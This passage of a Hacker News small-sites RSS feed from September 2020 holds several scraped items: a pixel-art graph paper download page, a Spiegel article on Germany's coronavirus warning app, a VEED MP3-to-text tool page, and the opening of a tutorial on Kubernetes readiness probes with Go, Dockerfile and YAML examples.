href="https://www.csiortho.com/spine-treatments/non-invasive-treatments/physical-therapy/">see how we can help</a>&nbsp;today.</p></article></div>]]>
            </description>
            <link>https://www.csiortho.com/blog/2018/september/7-foods-you-need-to-be-eating-for-spinal-health/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578356</guid>
            <pubDate>Thu, 24 Sep 2020 13:22:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Do you like pixel art? How about being able to make pixel art on paper?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578257">thread link</a>) | @gamedesign
<br/>
September 24, 2020 | https://gruhh.com/en/pixel-art-graph-paper/ | <a href="https://web.archive.org/web/*/https://gruhh.com/en/pixel-art-graph-paper/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page">
				<div id="content">
			
	<div id="primary">
		<main id="main">
			
<article id="post-2985" class="page" itemtype="https://schema.org/CreativeWork" itemscope="">
	<div>
		
		<div itemprop="text">
			
<div><div>




<p>Free! Just download, print and use‚Ä¶</p>
</div></div>



<div><div>
<div>
<div><div><div>
<p><strong>Want to make pixel art on paper?</strong> Whether for professional projects or for fun, explore your creativity in another medium.</p>



<p>We imagined a grid paper focused on the rapid development of analog pixel art. And that adapts to the printer that you have available.</p>



<ul><li>Create pixel art sketches</li><li>Explore the creative potential</li><li>Professional process</li><li>Free!</li></ul>
</div></div></div>



<div><div><div>
<div id="cta-landing-page-grid-game"><div>
<h2>Download now!</h2>







<p>Or choose one of the paper settings below!</p>
</div></div>
</div></div></div>
</div>







<hr>







<hr>




</div></div>



<div><div>
<div>
<div><div><p><strong>You who like experiences on paper‚Ä¶ </strong>We know how you feel! How about taking advantage of being here and discovering one of our board games to ‚Äúprint and play‚Äù?</p></div></div>



<div><div><div>
<h3>üëë Numerado</h3>



<p>In Numerado your objective is to build your own opportunities, making the most points, through the results of the operations.</p>



<ul><li>Strategy game</li><li>For 1 or many players</li></ul>




</div></div></div>
</div>
</div></div>



<div><div>
<div><div>
<div>
<div><div><div>




<p>Especially prepared for pixel art artists who want to explore their creativity.</p>
</div></div></div>



<div><div><div>




<p>No jokes. Just click, download and print your copy.</p>
</div></div></div>



<div><div><div>




<p>You download the PDF and print it at your home. With different configurations available.</p>
</div></div></div>
</div>
</div></div>
</div></div>




		</div><!-- .entry-content -->

			</div><!-- .inside-article -->
</article><!-- #post-## -->
		</main><!-- #main -->
	</div><!-- #primary -->

	
	</div><!-- #content -->
</div></div>]]>
            </description>
            <link>https://gruhh.com/en/pixel-art-graph-paper/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578257</guid>
            <pubDate>Thu, 24 Sep 2020 13:10:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lots of Work but Little Utility Germans Disappointed by Coronavirus Tracking App]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24578116">thread link</a>) | @dakna
<br/>
September 24, 2020 | https://www.spiegel.de/international/germany/lots-of-work-but-little-utility-germans-disappointed-by-coronavirus-tracking-app-a-7c30191e-b225-4c37-917d-41dc2a6078a1 | <a href="https://web.archive.org/web/*/https://www.spiegel.de/international/germany/lots-of-work-but-little-utility-germans-disappointed-by-coronavirus-tracking-app-a-7c30191e-b225-4c37-917d-41dc2a6078a1">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>On a June morning, an giant blue and red "C‚Äù logo was displayed in front of the Federal Press Office in Berlin, located on the Spree River in the heart of the capital. It was essentially the German government screaming for attention, and why not? Germany‚Äôs flagship project in the fight against the coronavirus pandemic was ready for prime time. Finally. "#Ichappmit,‚Äù a billboard read. "I‚Äôm using the app.‚Äù</p><div>
<p>Inside, five representatives of the German government and two board members from Deutsche Telekom and the software company SAP were on the stage, along with the president of Germany‚Äôs center for disease control, the Robert Koch Institute. They could easily have been mistaken for happy parents after a difficult birth.</p><p>Helga Braun, the head of Angela Merkel‚Äôs Chancellery and a member of her conservative Christian Democratic Union (CDU), said that although it wasn‚Äôt the first, it was perhaps the "best‚Äù corona app available worldwide. Interior Minister Horst Seehofer, likewise of the conservatives, praised the "first class‚Äù experts in the ministries. The CEO of Deutsche Telekom enthused that the app was a "rock star.‚Äù</p>
</div><div>
<p>The only person who seemed to be trying to manage expectations was German Health Minister Jens Spahn of the CDU. The app, he said, is "no panacea.‚Äù The sentence was a bit like the rip cord on a parachute. If expectations are kept low, you won‚Äôt hit the ground as hard if things go wrong.</p><p>That moment of euphoria was almost 100 days ago. Since then, more than 18 million people have downloaded the app, and it has been rated on the Apple and Google app stores with 4.4 and 3.1 out of five stars. The German government, for its part, considers it to be a great success.</p><h3><strong>"One Tool Among Many‚Äù</strong></h3><p>In fact, though, hopes that the virus might be contained using the app have given way to disillusionment. There is no longer any talk of the "very central building block‚Äù of pandemic management, as government spokesman Steffen Seibert described it even before the app‚Äôs launch. It has since become "one tool among many.‚Äù</p>
</div><div>
<p>But what has the app actually achieved? To what extent is it helping contain the pandemic?</p><p>It‚Äôs difficult to issue any kind of interim progress report due to a lack of solid data available. No one can say, for example, exactly how many smartphone users are actively using the app. "We currently assume that figure to be 14 million,‚Äù Deutsche Telekom responded when asked. The German Health Ministry, meanwhile, answered the same question with 17 to 18 million.</p><p>Comments on the internet suggest that many users are annoyed by the app and its strange error messages or confusing warnings. One customer recently asked in the App Store what the new error message "EN_Error‚Äù meant. One developer replied that it was an Apple problem. "Neither a reinstall nor restarting‚Äù the app would help, the developer wrote, but "sometimes the errors go away by themselves.‚Äù</p>
</div><div>
<p>The number of glitches has been painful, particularly because the app was hardly a bargain. It cost the government 15 million euros to develop it, and a further 44.4 million euros have been earmarked for "maintenance and care‚Äù during the operation of the app through 2021. As of August 27, the government had also spent 9.4 million euros advertising the app. "This app deserves your trust,‚Äù Chancellor Angela Merkel ensured her podcast listeners shortly after the launch.</p><p>Despite all the advertising, the numbers of downloads have been growing only slowly for some time now. Every second user now considers the app to be ineffective, as a survey&nbsp;for the initiative D21 and the Technical University of Munich has shown.</p><h3><strong>Further Development Needed</strong></h3><p>Some health and digital experts are urging for the app to be revised as soon as possible before infection rates start to increase even more with the arrival of the cold season in Germany. "The app urgently needs to be further developed in order to make it effective,‚Äù says Karl Lauterbach, the point man for health care policy for the center-left Social Democrats (SPD) and an epidemiologist by training.</p><p>Manuel H√∂ferlin, the point man for digital policy in the parliamentary group of the business-friendly Free Democrats (FDP), is critical of the government for having "rested for too long" following the app‚Äôs successful launch. With the exception of troubleshooting, he says, nothing has happened since then. He says it is "completely incomprehensible‚Äù to him why the app hasn‚Äôt been made available since then for older phone models and in App stores for people under the age of 17, as well.</p><p>The FDP politician also accuses Health Minister Spahn of having sowed confusion among users himself. "At times, he talked about the corona warning app and the data donation app and a quarantine app at the same time, which made many people uncertain and sacrificed important trust,‚Äù he says.</p><p>The truth, though, is that it was Spahn himself who got the app project rolling. It seemed to fit in perfectly with his agenda. When he became health minister two years ago, Spahn told an all-staff meeting at the Health Ministry that digitalization would be one of his core focuses. To back up that commitment, he set up a separate department for digitization, headed by Berlin-based health policy and digital health expert Gottfried Ludewig.</p><p>In the corona crisis, the Warn-App is one of the few measures with which he can stand out, given the federalist ramifications of a health policy system in which much of the responsibility is held by states and local governments. Early on, Spahn pointed to countries like South Korea, which succeeded in using mobile phone data to stop chains of infection. Spahn also saw the app as a way to get out of the lockdown in the long run.</p><p>But Spahn was too brash when it came to the implementation of the project, which unsettled many people. Initially, he wanted to enable the health authorities to request mobile phone cell data from telecommunications providers to trace infection chains. Following fierce protests, including objections from the Justice Ministry, Spahn backed down.</p><p>In the end, he pleaded for risk assessment to be carried out centrally on a server maintained by the Robert Koch Institute to obtain more data for pandemic control. That, in turn, also triggered protests. Hundreds of scientists and experts warned of "unprecedented surveillance.‚Äù</p><h3><strong>A Watered-Down App</strong></h3><p>Ultimately, the German government opted for what is called the decentralized solution - one in which the risk of coronavirus infection is determined by the smartphone itself. Apple and Google had announced that their operating systems would only support decentralized variants anyway.</p><p>Almost overnight, Chancellery Chief of Staff Helge Braun and Spahn commissioned the heads of Deutsche Telekom and SAP to develop that variant. It now meets the requirements of privacy and data protection, but it also weakens the app‚Äôs central task: that of stopping chains of infection early and widely.</p><p>At least that‚Äôs the view taken by Patrick Larscheid. The physician is the head of the public health department in the Berlin district of Reinickendorf. Each day, his team what the app should be able to take care of on its own: They perform contact tracing to warn people who may have been exposed to the coronavirus. They go about their work using traditional means - by interviewing infected persons and then phoning their contacts.</p><p>Theoretically, the app should be able to make such work easier. But Larscheid says that isn't the case and even compares the project with a fiasco in Transport Minister Andreas Scheuer‚Äôs ministry. "The app is Jens Spahn‚Äôs equivalent of (Scheuer‚Äôs) truck toll disaster ‚Äì it cost a lot of money and has no apparent benefit.‚Äù The disaster is a reference to a truck toll technology system that Germany bought but failed to implement, at a cost of hundreds of millions of taxpayer money. "This app does more harm than good,‚Äù he says.</p><p>Larscheid believes the app would have to collect significantly more data to be useful ‚Äì about the place and time of contact and also about the person, for example. "The app doesn‚Äôt even tell you if the alleged risk took place outdoors, on a commuter train or when visiting relatives in a hospital,‚Äù says Larscheid. The app‚Äôs algorithms operate with rough probabilities, he says, which isn't effective enough. "You would never ride in an autonomous vehicle that might or might not hit a tree,‚Äù he says.</p><h3><strong>Diminishing Interest</strong></h3><p>Other critics think the path chosen was the correct one, but that the execution has been less than stellar. "I have the impression that too many people are still only using the Warn-App out of their own interest ‚Äì in other words, in the expectation of being warned themselves, but without the willingness to warn others in turn. But if too many people do that, the app can‚Äôt provide the full effect it was intended to,‚Äù says Anke Domscheit-Berg, the digital policy point person for the Left Party in parliament.</p><p>That refusal could explain one odd statistic. According to Deutsche Telekom, only 3,613 positive test results had been reported via the hotline as of last Tuesday. Even assuming that app users follow the hygiene rules and are less likely to belong to risk groups, that number would be concerningly small if you consider that there have been around 80,000 confirmed new coronavirus infections since the app‚Äôs launch.</p><p>It‚Äôs possible that many infected people aren‚Äôt reporting their positive test results to their app. Or that many of those who downloaded the app in the early days are no longer using it.</p><p>The diminishing interest in the app could also have something to do with the many glitches that have accompanied the project. At first, it didn‚Äôt update automatically in the background on some devices as intended, meaning the app didn‚Äôt warn people reliably for weeks in those instances. It also took quite a while for the people in charge to admit the mistake.</p>
</div><div>
<p>Now, a new glitch is annoying users. If you update your iPhone with the new operating system 13.7, the app might ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.spiegel.de/international/germany/lots-of-work-but-little-utility-germans-disappointed-by-coronavirus-tracking-app-a-7c30191e-b225-4c37-917d-41dc2a6078a1">https://www.spiegel.de/international/germany/lots-of-work-but-little-utility-germans-disappointed-by-coronavirus-tracking-app-a-7c30191e-b225-4c37-917d-41dc2a6078a1</a></em></p>]]>
            </description>
            <link>https://www.spiegel.de/international/germany/lots-of-work-but-little-utility-germans-disappointed-by-coronavirus-tracking-app-a-7c30191e-b225-4c37-917d-41dc2a6078a1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578116</guid>
            <pubDate>Thu, 24 Sep 2020 12:53:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: MP3 to Text]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24578053">thread link</a>) | @sabbakeynejad
<br/>
September 24, 2020 | https://www.veed.io/tools/mp3-to-text#hn | <a href="https://web.archive.org/web/*/https://www.veed.io/tools/mp3-to-text#hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="Intro"><div><div id="w-node-be84c295ef36-ccc0cf0b"><h2><strong>Turn your MP3 into text files, online</strong></h2><p>Do you want to transcribe the speech from your MP3 into a text file? Well, now you can, with VEED! VEED‚Äôs online auto transcription tool is fast, free, and easy to use. Compatible not just with MP3s, but with WAVs, AACs, OGGs, M4As, and even video files - you can convert to text with the click of a button</p></div><p><img alt="" loading="lazy" src="https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2.png" sizes="100vw" srcset="https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2-p-500.png 500w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2-p-800.png 800w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5f2ab08f19e2546287724ff1_Transcribe%20Audio%20Files%20Automatically%2C%20Online2.png 1280w"></p></div><div><div id="w-node-be84c295ef39-ccc0cf0b"><h3><strong>MP3 to Text, Online</strong></h3><p>With VEED you can upload your MP3 files in your browser, no software required, and have a text transcription ready in no time</p></div><div id="w-node-be84c295ef3a-ccc0cf0b"><h3><strong>Automatic</strong></h3><p>No longer do you have to sit and listen, typing along to your MP3 files. Now VEED transcribes your MP3s automatically</p></div><div id="w-node-be84c295ef3b-ccc0cf0b"><h3><strong>Fast</strong></h3><p>Our super-fast, cloud-based servers will have your audio files uploaded, transcribed, and converted into text files in a matter of seconds. It‚Äôs so easy!</p></div><div id="w-node-be84c295ef3c-ccc0cf0b"><h3><strong>Edit</strong></h3><p>If you want to change anything, or add a note or comment, just click on a line of transcription and start typing!</p></div><div id="w-node-be84c295ef3d-ccc0cf0b"><h3><strong>Different Languages</strong></h3><p>VEED is able to recognise and transcribe languages from all over the world - English, Spanish, French, Chinese, and many more</p></div><div id="w-node-be84c295ef3e-ccc0cf0b"><h3><strong>Video Transcription</strong></h3><p>You can also upload video files (in multiple formats) and create transcriptions, add subtitles, or download subtitle (.srt) files</p></div></div></div><div id="How-to"><div><h2>How to transcribe MP3 to text:</h2><p>Transcribe your MP3 in 3 easy steps</p></div><div><div><div><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9b7b5d102969e0f443e9_cloud.png" loading="lazy" width="32" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9ba6edbc7fd0db328f8f_line.png" loading="lazy" width="2" alt=""></p></div><div><h3><strong>1. Upload</strong></h3><p>Upload your MP3 files to VEED. VEED is all online, no software required</p><p>‚Äç</p></div></div><div><div><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9b7a7679911e1f802d1d_scissors.png" loading="lazy" width="32" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9ba6edbc7fd0db328f8f_line.png" loading="lazy" width="2" alt=""></p></div><div><h3><strong>2. Convert to text</strong></h3><p>Under ‚ÄòSubtitles‚Äô, click ‚ÄòAuto Subtitles‚Äô, choose your language, and that‚Äôs it! Your MP3 transcript is generated</p><p>‚Äç</p></div></div><div><div><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3f9b7afbaf558411481ae3_Share.png" loading="lazy" width="32" alt=""></p></div><div><h3><strong>3. Download</strong></h3><p>You can now download in multiple formats - .txt, .vtt, .srt - whatever you need</p></div></div></div><div><div><p><h4>How to use VEED - Make social media video content online</h4><h5>591 views</h5></p></div></div></div><div id="use-cases"><div><h2>Why use our MP3 to Text tool?</h2><p>Turn your MP3s into text files, automatically</p></div><div><div><h3><strong>Quick</strong></h3><p>No need to download any software, you don't even need an account. Get started right away, with our super-fast MP3 to Text tool</p></div><div><h3><strong>Easy</strong></h3><p>You can create transcriptions of your MP3 with a single click, and make line-by-line edits with ease</p></div><div><h3><strong>Versatile</strong></h3><p>You can export your MP3 transcription as a text file, subtitle file, whatever you need</p></div></div></div><div id="testimonials"><div><p><img src="https://uploads-ssl.webflow.com/5ea7ec2f0fe2ee14fc247bf0/5f3fcd9f6ea642218575ff6d_quote.png" loading="lazy" width="28" alt=""></p><h2>What they say about <span>VEED</span></h2></div><div><div data-animation="slide" data-duration="500" data-infinite="1"><div><div><div><div><p>Veed is a great piece of browser software with the best team I've ever seen.</p><p>‚Äç</p><p>Veed allows for subtitling, editing, effect/text encoding, and many more advanced features that other editors just can't compete with. The free version is wonderful, but the Pro version is beyond perfect. Keep in mind that this a browser editor we're talking about and the level of quality that Veed allows is stunning and a complete game changer at worst.</p></div><p><strong>Chris Y.</strong></p></div></div><div><div><div><p>I love using VEED&nbsp;as the speech to subtitles transcription is the most accurate I've seen on the market.</p><p>‚Äç</p><p>It has enabled me to edit my videos in just a few minutes and bring my video content to the next level</p></div><p><strong>Laura Haleydt</strong> - Brand Marketing Manager, Carlsberg Importers</p></div></div><div><div><div><p>The Best &amp; Most Easy to Use Simple Video Editing Software!</p><p>‚Äç</p><p>I had tried tons of other online editors on the market and been disappointed. With VEED I haven't experienced any issues with the videos I create on there.</p><p>‚Äç</p><p>It has everything I need in one place such as the progress bar for my 1-minute clips, auto transcriptions for all my video content, and custom fonts for consistency in my visual branding.</p></div><p><strong>Diana B - </strong>Social Media Strategist, Self Employed</p></div></div></div></div></div></div><div id="more-things"><div><div><h2><strong>More than just an MP3 to Text tool</strong></h2><p>VEED is so much more than just an MP3 to Text converter - you can edit and create all kinds of video and audio. Create YouTube video intros, auto-generate subtitles, create Instagram Stories with links and stickers, add sound effects to your audio, join MP3 files together, and so much more!</p></div><p><img src="https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1).png" alt="" sizes="100vw" srcset="https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1)-p-500.png 500w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1)-p-800.png 800w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1)-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ea7ef450fe2ee1a3524891b/5efcc39090c5db4fed168b7a_ezgif.com-webp-to-png%20(1).png 1600w"></p></div></div></div></div>]]>
            </description>
            <link>https://www.veed.io/tools/mp3-to-text#hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-24578053</guid>
            <pubDate>Thu, 24 Sep 2020 12:44:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Resilient Kubernetes Deployments with Readiness Probes]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24577917">thread link</a>) | @rotemtam
<br/>
September 24, 2020 | https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/ | <a href="https://web.archive.org/web/*/https://rotemtam.com/2020/09/24/kubernetes-readiness-probes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <article>
  
  <time datetime="2020-09-24T00:00:00+00:00">24 Sep 2020</time>
  <h3 id="introduction">Introduction</h3>

<blockquote><p lang="en" dir="ltr">Let's stop fooling ourselves. What we call CI/CD is actually only CI.</p>‚Äî Ant(on) Weiss (@antweiss) <a href="https://twitter.com/antweiss/status/1308108094157787136?ref_src=twsrc%5Etfw">September 21, 2020</a></blockquote>


<p>Containers make CI much more manageable: reproducible, isolated build environments that create portable and predictable deployment artifacts. Continuously delivering containers to production turns out to be quite a difficult problem which we call collectively <em>container orchestration.</em></p>

<p>What do we need for continuous delivery? An automated and safe way of applying changes to our production environments. In the early days of containers, I once wrote a Node.js server that ssh‚Äôd into a host, updated a docker-compose manifest, and ran a restart command every time a new user signed up for service. (It was automated, but not particularly safe, let me just say)</p>

<p>The first time I heard about Kubernetes was when a team of actually talented engineers inherited my monstrosity and went on to build a proper system that would not crash and burn five times a day. Organizations turn to Kubernetes to facilitate container-based, automated, and safe delivery.</p>

<p>Kubernetes is truly an amazing piece of software, being the brainchild of some <a href="https://k8s.devstats.cncf.io/d/24/overall-project-statistics?orgId=1">10k committers</a> it has grown into a very complete platform for organizations to run containerized applications, with very fine-grained configuration options.  The problem is, that once you have so many options in your hands, some of the permutations that you can roll out can be wrong, or incomplete: failing to set correct configuration options can lead to sub-optimal (or even destructive) behavior of your applications.</p>

<p>Today I want to discuss one feature in the Kubernetes API which I have found to be particularly important to make our applications more resilient in production: <em>readiness probes.</em></p>

<h3 id="our-dummy-application">Our Dummy Application</h3>

<p>For the purpose of this post, we will be exploring different configuration options  of the Kubernetes Deployment API by playing with a tiny webserver example written in Go, this is the baseline:</p>

<div><div><pre><code><span>package</span> <span>main</span>

<span>import</span> <span>(</span>
	<span>"fmt"</span>
	<span>"log"</span>
	<span>"net/http"</span>
<span>)</span>

<span>func</span> <span>main</span><span>()</span> <span>{</span>
	<span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/"</span><span>,</span> <span>func</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
		<span>fmt</span><span>.</span><span>Fprint</span><span>(</span><span>w</span><span>,</span> <span>"Hello, Kubernetes!"</span><span>)</span>
	<span>})</span>
	<span>log</span><span>.</span><span>Fatal</span><span>(</span><span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>))</span>
<span>}</span>
</code></pre></div></div>

<p>To build it into a Docker image which we can then deploy to a Kubernetes cluster, we will use this Dockerfile:</p>

<div><div><pre><code><span># build the binary using a normal golang image</span>
<span>FROM</span><span> golang:1.15-buster as build</span>

<span>WORKDIR</span><span> /go/src/app</span>
<span>ADD</span><span> . /go/src/app</span>

<span>RUN </span>go build <span>-o</span> /go/bin/app

<span># then copy the binary distroless image</span>
<span>FROM</span><span> gcr.io/distroless/base-debian10</span>
<span>COPY</span><span> --from=build /go/bin/app /</span>
<span>CMD</span><span> ["/app"]</span>
</code></pre></div></div>

<p>In the above example, we are using a Docker multi-stage build, to first build the server binary in a <code>golang</code> image, and then copy it to a barebones <a href="https://github.com/GoogleContainerTools/distroless">distroless</a> docker image, in order to keep the size of the image minimal and reduce deployment times associated with resource downloads.</p>

<p>To build and push it to Public DockerHub:</p>

<div><div><pre><code>$ docker build -t rotemtam/k8s-deployment-blogpost:baseline .
$ docker push rotemtam/k8s-deployment-blogpost:baseline
</code></pre></div></div>

<h3 id="what-is-the-purpose-of-deployment-objects">What is the purpose of Deployment objects?</h3>

<figure>
    <img src="https://rotemtam.com/assets/deployment-rs-pod.png" alt="Source ">
    <figcaption>Source </figcaption>
  </figure>

<p><small>Source: <a href="http://wiki.ciscolinux.co.uk/index.php?title=Kubernetes/Deployment,_ReplicaSet_and_Pod">wiki.ciscolinux.co.uk</a></small></p>

<p>The Kubernetes designers did a fine job of providing us with an <em>Orthogonal Design</em>, that is, each part of the API is responsible for a specific task, and <em>only it</em> is responsible for that task. This is what the hierarchy looks like:</p>

<ul>
  <li><a href="https://kubernetes.io/docs/concepts/workloads/pods/">Pods</a> are the basic unit of scheduling compute, they are ephemeral and short-lived. They specify how to run a group of containers on a host. It is the Kubernetes control plane‚Äôs responsibility to then schedule this Pod on a specific node and run it.</li>
  <li><a href="https://kubernetes.io/docs/concepts/workloads/controllers/replicaset/">ReplicaSets</a> are simple controllers whose task is to keep maintaining a specific amount of pods of a certain PodSpec up and running on the cluster. If a pod dies, and there is now a gap between the desired state (I want 3 of this thing running) and current state (I now have only 2 of this thing running), it is the ReplicaSet‚Äôs responsibility to schedule a new pod of said spec in its place. A ReplicaSet lives longer than a pod, but it is (usually) pinned to a specific spec the RS lives for the lifetime of a <em>revision</em> of your application.</li>
  <li>A <a href="https://kubernetes.io/docs/concepts/workloads/pods/s">Deployment</a> is a high-level construct that is supposed to live for the entire lifecycle of an application, through many versions and releases. Deployments control how a cluster <em>rolls out</em> a new revision and allow for version <em>rollbacks</em> if needed. So unless you have some very specific orchestration requirements, your interface to scheduling (stateless) applications onto your cluster should be through the Deployment API. (for deploying stateful applications we use a s similar API - <code>StatefulSet</code>)</li>
</ul>

<h3 id="our-baseline-deployment-object">Our baseline Deployment object</h3>

<p>A minimal example for a deployment of our application would be:</p>

<div><div><pre><code><span># declare the object type: </span>
<span>apiVersion</span><span>:</span> <span>apps/v1</span>
<span>kind</span><span>:</span> <span>Deployment</span>

<span># define metadata about our deployment</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>webserver-deployment</span>
  <span>labels</span><span>:</span>
    <span>app</span><span>:</span> <span>webserver-deployment</span>

<span># define the spec for our deployment </span>
<span>spec</span><span>:</span>
  <span>replicas</span><span>:</span> <span>3</span>
  <span>selector</span><span>:</span>
    <span>matchLabels</span><span>:</span>
      <span>app</span><span>:</span> <span>webserver-deployment</span>

  <span># define the template for the Pods created by this deployment</span>
  <span>template</span><span>:</span>
    <span>metadata</span><span>:</span>
      <span>labels</span><span>:</span>
        <span>app</span><span>:</span> <span>webserver-deployment</span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
      <span># define a single container</span>
      <span>-</span> <span>name</span><span>:</span> <span>webserver</span>
        <span># using our pushed docker image</span>
        <span>image</span><span>:</span> <span>rotemtam/k8s-deployment-blogpost:baseline</span>
        <span>ports</span><span>:</span>
        <span># expose port 8080</span>
        <span>-</span> <span>containerPort</span><span>:</span> <span>8080</span>
</code></pre></div></div>

<p>To be able to make requests against our app we will expose it with a <code>Service</code> object:</p>

<div><div><pre><code><span># service.yaml:</span>
<span>apiVersion</span><span>:</span> <span>v1</span>
<span>kind</span><span>:</span> <span>Service</span>
<span>metadata</span><span>:</span>
  <span>name</span><span>:</span> <span>k8s-blogpost-svc</span>
<span>spec</span><span>:</span>
  <span>selector</span><span>:</span>
    <span>app</span><span>:</span> <span>webserver-deployment</span>
  <span>ports</span><span>:</span>
    <span>-</span> <span>protocol</span><span>:</span> <span>TCP</span>
      <span>port</span><span>:</span> <span>8080</span>
      <span>targetPort</span><span>:</span> <span>8080</span>
</code></pre></div></div>

<p>To test that everything is up and running:</p>

<div><div><pre><code>$ kubectl run curl --image=curlimages/curl --rm --restart=Never -it curl http://k8s-blogpost-svc:8080

Hello, Kubernetes!
</code></pre></div></div>

<p>Hooray!</p>

<h3 id="dealing-with-slow-starting-containers">Dealing with slow starting containers</h3>

<p><img src="https://media.giphy.com/media/3o6MbnqLhX5tJ5wNQQ/giphy.gif" alt="https://media.giphy.com/media/3o6MbnqLhX5tJ5wNQQ/giphy.gif"></p>

<p>Assume that our server needs to perform some initial work before it is ready to serve traffic, perhaps it is downloading some data from storage and processing it into an in-memory data structure which it uses to answer queries. The way Kubernetes works by default is that traffic will be routed to our Pod as soon as the main process in at least one of its containers (not including initContainers) is running. This means that there will be a period of time in which traffic is routed to our Pod without it being able to serve traffic; depending on the <a href="https://kubernetes.io/docs/concepts/services-networking/service/#virtual-ips-and-service-proxies">kube-proxy mode</a> of our clusters, this could result in a spike of 5xx errors whenever a new Pod is scheduled successfully.</p>

<p>To see this in action, let‚Äôs modify our webserver code such that it is slow to start by adding a sleep before starting the webserver:</p>

<div><div><pre><code><span>package</span> <span>main</span>

<span>import</span> <span>(</span>
	<span>"fmt"</span>
	<span>"log"</span>
	<span>"net/http"</span>
	<span>"time"</span>
<span>)</span>

<span>func</span> <span>main</span><span>()</span> <span>{</span>
	<span>fmt</span><span>.</span><span>Println</span><span>(</span><span>"Taking a nap.."</span><span>)</span>
	<span>time</span><span>.</span><span>Sleep</span><span>(</span><span>time</span><span>.</span><span>Second</span> <span>*</span> <span>30</span><span>)</span>
	<span>fmt</span><span>.</span><span>Println</span><span>(</span><span>"Ready to serve traffic!"</span><span>)</span>
	<span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/"</span><span>,</span> <span>func</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
		<span>fmt</span><span>.</span><span>Fprint</span><span>(</span><span>w</span><span>,</span> <span>"Hello, Kubernetes!"</span><span>)</span>
	<span>})</span>
	<span>log</span><span>.</span><span>Fatal</span><span>(</span><span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>))</span>
<span>}</span>
</code></pre></div></div>

<p>Building and pushing the new version:</p>

<div><div><pre><code>$ docker build -t rotemtam/k8s-deployment-blogpost:slow-boot .
$ docker push rotemtam/k8s-deployment-blogpost:slow-boot
</code></pre></div></div>

<p>Modifying our deployment yaml to change the docker image:</p>

<div><div><pre><code><span># ... unchanged stuff</span>
    <span>spec</span><span>:</span>
      <span>containers</span><span>:</span>
      <span># define a single container</span>
      <span>-</span> <span>name</span><span>:</span> <span>webserver</span>
        <span># using our pushed docker image</span>
        <span>image</span><span>:</span> <span>rotemtam/k8s-deployment-blogpost:slow-boot</span>
<span># more unchanged stuff ...</span>
</code></pre></div></div>

<p>If we immediately run our curl command we will see:</p>

<div><div><pre><code><span>$ </span>kubectl run curl <span>--image</span><span>=</span>curlimages/curl <span>--rm</span> <span>--restart</span><span>=</span>Never <span>-it</span> curl http://k8s-blogpost-svc:8080

curl: <span>(</span>7<span>)</span> Failed to connect to k8s-blogpost-svc port 8080: Connection refused
</code></pre></div></div>

<p>How does this happen?</p>

<ol>
